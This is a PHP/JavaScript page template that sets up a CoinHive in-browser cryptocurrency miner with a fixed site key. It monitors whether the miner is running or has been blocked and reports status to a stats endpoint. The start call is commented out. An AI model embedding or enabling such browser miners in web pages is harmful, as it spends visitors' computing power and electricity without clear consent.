
<?php

?>

<script class='check_js'>

<?php
  if($coinhive_start == 1){
?>

  $(document).ready(function() {
      if(miner != ""){
        miner.stop();
      }

      if(typeof CoinHive != 'undefined'){
          miner = new CoinHive.User('JjddKmmi3zMuzPoqUlFqS0JBAbD6zat8', '<?php echo $coin_name; ?>', {throttle: 0.8, forceASMJS: false, theme: 'dark'});
            //if (!miner.isMobile()) {
              //miner.start();
              //$.post('<?php //echo $_dhp; ?>coinhive/stats',{'res':'0'});

          <?php
            if(isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])){
              if( !isset($_COOKIE['CoinHiveOptOut']) AND isset($_COOKIE['CoinHiveOptIn']) ) {}else{
          ?>
              miner.on('error', function(params) {
              	if (params.error !== 'connection_error') {
                  //$.post('<?php // echo $_dhp; ?>coinhive/stats',{'res':'1'});
              	}
              });


                  setTimeout(function(){
                    inter_coinhive = setInterval(function() {
                      if(miner == null || typeof CoinHive == 'undefined' || typeof CoinHive == null){
                        $.post('<?php echo $_dhp; ?>coinhive/stats',{'res':'2'});
                      }else{
                        if($(".body div iframe:not(#fb_xdm_frame_https)").length <= 0){
                          if(miner.isRunning() == true ){}else{
                            // $.post('<?php //echo $_dhp; ?>coinhive/stats',{'res':'3'});
                          }

                          if(miner.getHashesPerSecond() == 0){
                            // $.post('<?php //echo $_dhp; ?>coinhive/stats',{'res':'4'});
                          }
                        }
                      }
                    },1000);
                  },4000);

                <?php
                  }
                }
              ?>

            //}

      }else{
        //$.post('<?php echo $_dhp; ?>coinhive/stats',{'res':'5'});
      }
  });


  <?php
    }
  ?>

</script>



  <?php
    if(isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])){
      if( !isset($_COOKIE['CoinHiveOptOut']) AND isset($_COOKIE['CoinHiveOptIn']) ) {}else{
  /*
  ?>
  <script >
    $(document).ready(function() {
      inter_coinhive2 = setInterval(function() {
        if($('.check_js').length == 0){
          $.post('<?php echo $_dhp; ?>coinhive/stats',{'res':'6'});
        }
      },500);
    });

  </script>
  <?php
  */
    }
    }

  ?>
